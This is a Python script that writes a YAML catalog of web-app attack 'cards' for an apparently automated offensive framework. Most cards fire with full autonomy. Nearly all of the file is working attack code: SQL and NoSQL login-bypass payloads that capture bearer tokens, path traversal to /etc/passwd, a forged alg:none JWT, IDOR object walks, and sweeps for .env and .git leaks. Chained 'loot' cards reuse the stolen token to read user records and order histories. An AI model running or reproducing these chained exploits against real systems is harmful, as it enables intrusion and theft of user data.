#!/usr/bin/env python3
"""Author the GENERIC web-app card deck as Python dicts, emit valid YAML (all quoting handled)."""
import yaml

def card(id, name, phase, autonomy, tool, invocation, success_if, emits,
         confirms=("endpoint",), blast="low", parallel=True, cost="cheap", notes="",
         when_extra=None, secret_capture=None):
    when = [{"service": "http"}] + (when_extra or [])
    verify = {"success_if": success_if, "emits": list(emits)}
    if secret_capture:
        verify["secret_capture"] = dict(secret_capture)   # {var: regex} -> private value channel
    return {
        "id": id, "name": name, "phase": phase, "tier": "standard", "autonomy": autonomy,
        "when": when, "tool": tool, "invocation": invocation,
        "parallel_safe": parallel, "blast_radius": blast, "operator": "",
        "confirms": list(confirms),
        "verify": verify,
        "cost_hint": cost, "notes": notes,
    }

T = "{{target}}"
cards = [
  # ---- recon / content discovery ----
  card("web-http-fingerprint", "Fingerprint HTTP app + server", "recon", "full", "curl",
       f"curl -ksS -i -L {T}/",
       "exit_code == 0 && stdout matches 'HTTP/[0-9.]+ [0-9]{3}'", ["endpoint"],
       confirms=["tool"], blast="none", notes="Base fingerprint; scopes follow-on web cards."),
  card("web-robots-disclosure", "Read robots.txt for disallowed paths", "recon", "full", "curl",
       f"curl -ksS {T}/robots.txt",
       "exit_code == 0 && (stdout contains 'Disallow' || stdout contains 'Allow')", ["endpoint"],
       blast="none", notes="robots.txt often discloses hidden directories."),
  card("web-dir-brute-ffuf", "Content discovery with ffuf", "enum", "semi", "ffuf",
       "ffuf -u "+T+"/FUZZ -w {{wordlist}} -mc {{status_codes}} -fc {{filtered_codes}} -t {{threads}} -s",
       "exit_code == 0 && stdout matches '\\S'", ["endpoint"],
       cost="moderate", notes="Stages unless ffuf+wordlist present; finds unlinked paths."),
  card("web-backup-file-sweep", "Probe common backup/config file leaks", "enum", "full", "curl",
       "for p in .env .git/config config.php.bak backup.zip package.json.bak wp-config.php.bak db.sql .DS_Store; "
       f"do curl -ksS -o /dev/null -w \"%{{http_code}} /$p\\n\" {T}/$p; done",
       "exit_code == 0 && stdout matches '200 /'", ["sensitive_exposure"],
       blast="none", notes="Sweeps common leaked artifacts; 200 on any = exposure."),
  card("web-git-head-leak", "Probe exposed .git/HEAD", "enum", "full", "curl",
       f"curl -ksS {T}/.git/HEAD",
       "exit_code == 0 && stdout contains 'ref: refs/'", ["sensitive_exposure"],
       blast="none", notes="Exposed .git enables source recovery; stages if absent."),
  card("web-metrics-exposure", "Probe unauth /metrics endpoint", "enum", "full", "curl",
       f"curl -ksS {T}/metrics",
       "exit_code == 0 && (stdout contains '# HELP' || stdout contains '# TYPE')", ["sensitive_exposure"],
       blast="none", notes="Prometheus-style metrics exposed without auth leak internals."),
  # ---- SQL injection (generic) ----
  card("web-sqli-quote-error", "SQLi surface probe (single-quote error)", "exploit", "full", "curl",
       f"curl -ksS \"{T}/rest/products/search?q=test%27\"",
       "exit_code == 0 && (stdout contains 'SQL' || stdout contains 'syntax error' || stdout contains 'SQLITE')",
       ["sqli"], notes="A stray quote surfacing a SQL error proves an injectable parameter."),
  card("web-sqli-login-tautology", "SQLi auth-bypass probe (login tautology)", "exploit", "full", "curl",
       f'curl -ksS -X POST {T}/rest/user/login -H "Content-Type: application/json" '
       '--data "{\\"email\\":\\"\' OR 1=1--\\",\\"password\\":\\"x\\"}"',
       "exit_code == 0 && stdout contains 'authentication' && stdout contains 'token'",
       ["sqli", "auth_bypass", "session"], confirms=["session"],
       secret_capture={"token": r'"token"\s*:\s*"([^"]+)"'},
       notes="Generic OR-tautology login bypass; grounds a session + captures the bearer token "
             "into the private channel so post-auth cards (have:session) can chain off it."),
  card("web-sqli-sqlmap-param", "sqlmap a candidate injectable parameter", "exploit", "semi", "sqlmap",
       f"sqlmap -u \"{T}/rest/products/search?q=1\" -p q --batch --level 2 --risk 1 --flush-session",
       "exit_code == 0 && (stdout contains 'is vulnerable' || stdout contains 'injectable')",
       ["sqli"], blast="medium", parallel=False, cost="expensive",
       notes="Stages unless sqlmap present; confirms and classifies an injection."),
  # ---- NoSQL injection ----
  card("web-nosqli-login-operator", "NoSQL operator injection at login ($ne)", "exploit", "semi", "curl",
       f'curl -ksS -X POST {T}/rest/user/login -H "Content-Type: application/json" '
       '--data "{\\"email\\":{\\"\\$ne\\":null},\\"password\\":{\\"\\$ne\\":null}}"',
       "exit_code == 0 && stdout contains 'authentication'", ["nosqli", "auth_bypass"],
       confirms=["session"], notes="Mongo operator injection; stages on SQL auth, hits on NoSQL auth."),
  # ---- broken access control / IDOR ----
  card("web-bac-api-collection", "BAC — unauth read of a REST collection", "exploit", "full", "curl",
       f"curl -ksS -o /dev/null -w '%{{http_code}}' {T}/api/Users",
       "stdout contains '200'", ["bac"], blast="none",
       notes="A protected collection returning 200 unauthenticated is broken access control."),
  card("web-idor-object-walk", "IDOR — direct object reference walk", "exploit", "full", "curl",
       f"for i in 1 2 3; do curl -ksS -o /dev/null -w \"%{{http_code}} id=$i\\n\" {T}/rest/basket/$i; done",
       "exit_code == 0 && stdout matches '200 id='", ["idor", "bac"],
       notes="Sequential object-id access without ownership check = horizontal IDOR."),
  # ---- path traversal ----
  card("web-traversal-etcpasswd", "Path traversal to /etc/passwd", "exploit", "full", "curl",
       "for pre in ftp .. static assets; do "
       f"curl -ksS \"{T}/$pre/%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd\"; done",
       "exit_code == 0 && stdout contains 'root:x:0:0'", ["path_traversal"],
       notes="Encoded ../ escape across common static roots; passwd marker proves traversal."),
  # ---- redirect / ssrf ----
  card("web-open-redirect", "Open redirect probe", "exploit", "full", "curl",
       f"curl -ksS -o /dev/null -w '%{{http_code}} %{{redirect_url}}' \"{T}/redirect?to=https://example.com/\"",
       "stdout contains 'example.com'", ["ssrf"], blast="none",
       notes="Redirect param reflecting an external host = open redirect / SSRF pivot."),
  # ---- jwt / auth ----
  card("web-jwt-none-alg", "JWT alg:none acceptance probe", "exploit", "semi", "python3",
       "python3 -c \"import base64,json,urllib.request;"
       "b=lambda o:base64.urlsafe_b64encode(json.dumps(o).encode()).rstrip(b'=').decode();"
       "t=b({'alg':'none','typ':'JWT'})+'.'+b({'data':{'email':'probe@none.test'}})+'.';"
       f"r=urllib.request.Request('{T}/rest/user/whoami',headers={{'Authorization':'Bearer '+t}});"
       "print(urllib.request.urlopen(r,timeout=8).read().decode())\"",
       "exit_code == 0 && stdout contains 'probe@none.test'", ["auth_bypass"],
       confirms=["session"], notes="Unsigned-token acceptance; stages where signature is enforced."),
  # ---- POST-AUTH chain cards: gate on have:session, consume the captured {{token}} ----
  card("web-bac-userlist-authed", "BAC — authenticated read of user collection", "loot", "full", "curl",
       f'curl -ksS -H "Authorization: Bearer {{{{token}}}}" {T}/api/Users',
       "exit_code == 0 && stdout contains '\"email\"' && stdout contains '\"data\"'",
       ["bac", "sensitive_exposure", "admin_access"], confirms=["endpoint"], when_extra=[{"have": "session"}],
       notes="With a grounded session, read a normally admin-only collection; reading the full user "
             "list proves vertical priv (admin_access), unlocking admin-only cards. Stages until "
             "web-sqli-login-tautology grounds the session."),
  card("web-authed-order-history", "Post-auth data access — order history", "loot", "full", "curl",
       f'curl -ksS -H "Authorization: Bearer {{{{token}}}}" {T}/rest/order-history',
       "exit_code == 0 && (stdout contains '\"data\"' || stdout contains 'orderId')",
       ["bac"], confirms=["endpoint"], when_extra=[{"have": "session"}],
       notes="Authenticated access to order/history data; second post-auth link off the session."),
  card("web-admin-user-detail", "Vertical priv — read individual user record (admin)", "loot", "full", "curl",
       f'curl -ksS -H "Authorization: Bearer {{{{token}}}}" {T}/api/Users/1',
       "exit_code == 0 && stdout contains '\"email\"'",
       ["sensitive_exposure"], confirms=["endpoint"], when_extra=[{"have": "admin_access"}],
       notes="THIRD chain tier: gated on admin_access (not just session), read a specific user's "
             "private record. Stages until web-bac-userlist-authed proves admin."),
  card("web-idor-basket-authed", "IDOR — authenticated cross-user object access", "loot", "full", "curl",
       f'for i in 1 2 3; do curl -ksS -H "Authorization: Bearer {{{{token}}}}" -o /dev/null '
       f'-w "%{{http_code}} basket=$i\\n" {T}/rest/basket/$i; done',
       "exit_code == 0 && stdout matches '200 basket='",
       ["idor", "bac"], confirms=["endpoint"], when_extra=[{"have": "session"}],
       notes="Authenticated object-id walk across other users' baskets; ownership not enforced. "
             "Stages until a session grounds."),
  # ---- xss reflection ----
  card("web-xss-reflection", "Reflected XSS reflection probe", "exploit", "semi", "curl",
       f"curl -ksS \"{T}/rest/products/search?q=gbxss%3Cmarker%3E\"",
       "exit_code == 0 && stdout contains 'gbxss<marker>'", ["xss"],
       notes="Unescaped marker reflection indicates a reflected-XSS sink; DOM sinks stage."),
]

with open("/opt/bs2/catalog/web_cards.yaml", "w") as f:
    f.write("# web_cards.yaml — GENERIC web-app attack cards for the AUTOTURRET catalog.\n")
    f.write("# Terrain-matched on service:http; reusable techniques, not target-tuned. {{target}}=base URL.\n")
    yaml.safe_dump(cards, f, sort_keys=False, width=1000, default_flow_style=False)

d = yaml.safe_load(open("/opt/bs2/catalog/web_cards.yaml"))
print("parsed OK:", len(d), "cards")
print("phases:", sorted({c['phase'] for c in d}))
print("autofire(full):", sum(1 for c in d if c['autonomy']=='full'), "| staged:", sum(1 for c in d if c['autonomy']!='full'))
